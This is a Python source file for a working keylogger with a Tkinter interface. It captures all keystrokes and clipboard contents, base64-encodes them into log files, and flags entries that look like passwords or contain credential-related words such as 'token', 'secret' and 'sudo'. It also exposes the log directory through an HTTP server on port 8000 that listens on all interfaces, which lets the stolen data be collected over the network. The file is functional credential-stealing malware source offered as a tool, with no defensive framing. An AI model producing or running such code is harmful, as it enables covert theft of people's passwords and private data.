import tkinter as tk
from tkinter import scrolledtext, ttk
from pynput.keyboard import Listener
from datetime import datetime
import time
import base64
import os
from threading import Thread
from http.server import SimpleHTTPRequestHandler, HTTPServer
import pyperclip
import re

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("900x600")
        self.root.configure(bg="#0D1117")  # Dark background
        self.log_file = "keylog_encoded.txt"  # Directly store Base64-encoded logs
        self.clipboard_log_file = "clipboard_log_encoded.txt"
        self.last_clipboard_content = None
        self.clipboard_check_interval = 1  # Check every second
        self.password_attempt_count = 0
        self.password_attempt_threshold = 3  # Threshold for consecutive attempts
        self.password_pattern = re.compile(r'^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*?&#])[A-Za-z\d@$!%*?&#]+$')
        self.sensitive_words = ["admin", "administrator", "user", "login", "logout", "register", "sign up", "sign in", "password", "pass", "key", "token", "secret", "credentials", "2fa", "root", "superuser", "sudo", "privilege", "access", "test", "guest", "default", "welcome", "letmein", "iloveyou", "123456", "qwerty", "abc123", "monkey", "password1", "admin123", "123456789"]


        Thread(target=self.monitorClipboard, daemon=True).start()

        # Set DPI awareness (Windows only)
        try:
            from ctypes import windll
            windll.shcore.SetProcessDpiAwareness(1)
        except:
            pass

        # Modern title
        self.title_label = tk.Label(
            root, text="Keylogger", font=("Bahnschrift", 28, "bold"),
            fg="#C9D1D9", bg="#0D1117"
        )
        self.title_label.pack(pady=10)

        # Subtitle instruction
        self.subtitle_label = tk.Label(
            root, text="Track those keystrokes.",
            font=("Arial", 16), fg="#8B949E", bg="#0D1117"
        )
        self.subtitle_label.pack(pady=5)

        # Main frame to hold cards and log display
        self.main_frame = tk.Frame(root, bg="#0D1117")
        self.main_frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)

        # Card-like frame for the log display
        self.log_card = tk.Frame(self.main_frame, bg="#161B22", bd=0, relief='ridge')
        self.log_card.pack(side=tk.LEFT, padx=10, pady=10, fill=tk.BOTH, expand=True)

        # Scrollable text area for the keylogger output
        self.log_display = scrolledtext.ScrolledText(
            self.log_card, wrap=tk.WORD, font=("Consolas", 14),
            bg="#0D1117", fg="#C9D1D9", insertbackground='#58A6FF',
            borderwidth=0, relief='flat'
        )
        self.log_display.pack(padx=15, pady=15, fill=tk.BOTH, expand=True)

        # Card for buttons with a soft shadow effect
        self.button_card = tk.Frame(self.main_frame, bg="#161B22", bd=0, relief='ridge')
        self.button_card.pack(side=tk.RIGHT, padx=10, pady=10, fill=tk.Y)

        # Clear Log Button with modern styling
        self.clear_button = tk.Button(
            self.button_card, text="Clear Log", command=self.clearLog,
            font=("Arial", 16), bg="#238636", fg="white",
            activebackground="#2EA043", activeforeground="white",
            borderwidth=0, relief='flat', padx=10, pady=5
        )
        self.clear_button.pack(pady=20, padx=10, fill=tk.X)

        # Start the keylogger listener
        self.startKeylogger()
        self.word_stack = []
        self.latesttime = time.time()

        # Start HTTP server in a new thread
        Thread(target=self.startHttpServer, daemon=True).start()

    def monitorClipboard(self):
        """Continuously monitors clipboard for new content on frequent Ctrl+C events."""
        while True:
            try:
                clipboard_content = pyperclip.paste()
                if clipboard_content != self.last_clipboard_content:
                    self.last_clipboard_content = clipboard_content
                    self.logClipboardData(clipboard_content)
            except Exception as e:
                print("Clipboard monitoring error:", e)
            time.sleep(self.clipboard_check_interval)  # Check every interval

    def logClipboardData(self, content):
        """Log Base64-encoded clipboard content to file."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"\n[{timestamp}] Clipboard Content: {content}\n"
        
        # Update log display
        self.log_display.insert(tk.END, entry)
        self.log_display.see(tk.END)

        # Encode and save to file
        encoded_entry = base64.b64encode(entry.encode()).decode()
        with open(self.clipboard_log_file, "a") as f:
            f.write(encoded_entry + "\n")

    def wordStacker(self, key):
        key = str(key).replace("'", "")

        # Handle special keys except Backspace, Enter, and Space
        special_keys = {
            'Key.tab': ' [TAB] ',
            'Key.shift': ' [SHIFT] ',
            'Key.ctrl_l': ' [CTRL] ',
            'Key.ctrl_r': ' [CTRL] ',
            'Key.alt_l': ' [ALT] ',
            'Key.alt_r': ' [ALT] ',
            'Key.esc': ' [ESC] ',
            'Key.up': ' [UP] ',
            'Key.down': ' [DOWN] ',
            'Key.left': ' [LEFT] ',
            'Key.right': ' [RIGHT] '
        }

        if key in special_keys:
            self.enqueueIntoLog(special_keys[key])
        elif key == 'Key.backspace':
            try:
                self.word_stack.pop(-1)  # Handle backspace
            except IndexError:
                pass
        elif key == 'Key.space':
            self.enqueueIntoLog(''.join(self.word_stack) + ' ') 
            self.checkForPasswordAttempt(''.join(self.word_stack))  # Check full entry here
            self.checkForSensitiveWords(''.join(self.word_stack))  # Check for sensitive words
            self.word_stack.clear()
        elif key == 'Key.enter':
            self.enqueueIntoLog(''.join(self.word_stack) + '\n[ENTER]\n')
            self.checkForPasswordAttempt(''.join(self.word_stack))  # Check full entry here
            self.checkForSensitiveWords(''.join(self.word_stack))  # Check for sensitive words
            self.word_stack.clear()
        else:
            self.word_stack.append(key)

    def enqueueIntoLog(self, entry):
        """Add a new entry to the log display and save it to the Base64-encoded file."""
        current = time.time()
        if current - self.latesttime > 30:
            timestamp = datetime.now().strftime("\n%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp}\n{entry}"
        else:
            log_entry = entry

        self.log_display.insert(tk.END, log_entry)
        self.log_display.see(tk.END)
        self.latesttime = time.time()
        self.saveLog(log_entry)
    
    def checkForPasswordAttempt(self, entry):
        """Check if the completed entry is likely a failed password attempt."""
        if self.password_pattern.match(entry):
            self.password_attempt_count += 1
            if self.password_attempt_count >= self.password_attempt_threshold:
                self.enqueueIntoLog("ALERT: Three consecutive failed password attempts detected!")
                self.password_attempt_count = 0  # Reset after alert
        else:
            self.password_attempt_count = 0  # Reset if criteria not met

    def checkForSensitiveWords(self, entry):
        """Check if the entry contains any sensitive words."""
        # Convert entry to lowercase for case-insensitive comparison
        entry_lower = entry.lower()
        for word in self.sensitive_words:
            if word in entry_lower:
                self.enqueueIntoLog(f"ALERT: Sensitive word detected: '{word}'")
                break  # Stop checking after the first match

    def saveLog(self, entry):
        """Append log entries as Base64-encoded data."""
        encoded_entry = base64.b64encode(entry.encode()).decode()
        with open(self.log_file, "a") as f:
            f.write(encoded_entry + "\n")

    def clearLog(self):
        """Clear the log display and the Base64-encoded file."""
        self.log_display.delete(1.0, tk.END)
        open(self.log_file, "w").close()  # Clear the encoded log file

#STARTS HERE
    def startKeylogger(self):
        """Start the keylogger listener."""
        self.listener = Listener(on_press=self.wordStacker)
        self.listener.start()

    def startHttpServer(self):
        """Host the directory on a local HTTP server."""
        server_address = ("", 8000)  # Host on localhost:8000
        httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
        print("Serving on http://0.0.0.0:8000")
        httpd.serve_forever()

    def onClose(self):
        """Stop the keylogger and close the GUI."""
        self.listener.stop()
        self.root.destroy()

# GUI initialization
root = tk.Tk()
app = KeyloggerGUI(root)

root.protocol("WM_DELETE_WINDOW", app.onClose)
root.mainloop()
